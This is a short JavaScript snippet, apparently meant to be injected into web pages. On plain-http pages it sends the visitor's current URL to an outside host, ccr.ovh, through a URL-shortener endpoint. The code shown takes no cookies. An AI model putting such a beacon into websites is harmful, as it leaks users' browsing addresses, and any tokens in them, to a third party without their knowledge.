function cookiez_httpGetAsync(theUrl, callback)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.onreadystatechange = function() { 
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
            callback(xmlHttp.responseText);
    }
    xmlHttp.open("GET", theUrl, true); // true for asynchronous 
    xmlHttp.send(null);
}

function cookiez_injExecute() {
	if(location.protocol == "http:") {
		cookiez_httpGetAsync("http://ccr.ovh/shortenurl.php?mode=shortenurl&url=" + window.location.href, function(r) {
			console.log(r);
		});
	}
}